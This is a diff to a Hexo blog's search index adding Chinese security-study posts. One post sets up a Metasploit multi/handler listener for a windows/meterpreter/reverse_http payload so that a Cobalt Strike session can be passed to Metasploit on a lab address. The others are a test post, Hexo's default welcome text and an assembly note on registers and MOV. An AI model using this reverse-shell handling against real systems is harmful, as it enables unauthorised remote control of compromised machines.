@@ -4,12 +4,37 @@
   
     
     <entry>
+      <title>cs派生msf会话</title>
+      <link href="/post/d5b83abf.html"/>
+      <url>/post/d5b83abf.html</url>
+      
+        <content type="html"><![CDATA[<h3 id="cs派生msf会话"><a href="#cs派生msf会话" class="headerlink" title="cs派生msf会话"></a>cs派生msf会话</h3><h3 id="msf端"><a href="#msf端" class="headerlink" title="msf端"></a>msf端</h3><p>建立监听</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set lhost 192.168.164.137</span><br><span class="line">set lport 6666</span><br><span class="line">set payload windows/meterpreter/reverse_http</span><br></pre></td></tr></table></figure><p><img src="C:\Users\R\AppData\Roaming\Typora\typora-user-images\image-20211018182352909.png" alt="image-20211018182352909"></p><h3 id="cs端"><a href="#cs端" class="headerlink" title="cs端"></a>cs端</h3><p>cs建立新会话<br><img src="C:\Users\R\AppData\Roaming\Typora\typora-user-images\image-20211018182530617.png" alt="image-20211018182530617"></p><p>建立好后msf运行，cs中转即可<br><img src="C:\Users\R\AppData\Roaming\Typora\typora-user-images\image-20211018191210430.png" alt="image-20211018191210430"><br><img src="C:\Users\R\AppData\Roaming\Typora\typora-user-images\image-20211018191227985.png" alt="image-20211018191227985"><br><img src="C:\Users\R\AppData\Roaming\Typora\typora-user-images\image-20211018191810657.png" alt="image-20211018191810657"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> CS和kali </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>test1</title>
       <link href="/post/8ab2dce2.html"/>
       <url>/post/8ab2dce2.html</url>
       
         <content type="html"><![CDATA[<h2 id="thisistest"><a href="#thisistest" class="headerlink" title="thisistest"></a>thisistest</h2><p>** ss **</p>]]></content>
       
+      
+      <categories>
+          
+          <category> 靶场 </category>
+          
+      </categories>
       
       
     </entry>
@@ -23,6 +48,31 @@
       
         <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
       
+      
+      <categories>
+          
+          <category> 网络安全 </category>
+          
+      </categories>
+      
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>通用寄存器内存读写</title>
+      <link href="/post/dbe362f1.html"/>
+      <url>/post/dbe362f1.html</url>
+      
+        <content type="html"><![CDATA[<h2 id="通用寄存器内存读写"><a href="#通用寄存器内存读写" class="headerlink" title="通用寄存器内存读写"></a>通用寄存器内存读写</h2><p>通用寄存器：</p><p><img src="C:\Users\R\AppData\Roaming\Typora\typora-user-images\image-20211019164222834.png" alt="image-20211019164222834"></p><p>其中AL包含在AX中，AX包含在EAX中：</p><p><img src="C:\Users\R\AppData\Roaming\Typora\typora-user-images\image-20211019164331023.png" alt="image-20211019164331023"></p><p>汇编指令：</p><p>汇编指令由：操作码，目标操作数，源操作数组成。</p><p>目的：将原操作数复制一份到目标操作数中。</p><p>MOV的语法：</p><p><img src="C:\Users\R\AppData\Roaming\Typora\typora-user-images\image-20211019170611303.png" alt="image-20211019170611303"></p>]]></content>
+      
+      
+      <categories>
+          
+          <category> 学习 </category>
+          
+      </categories>
       
       
     </entry>
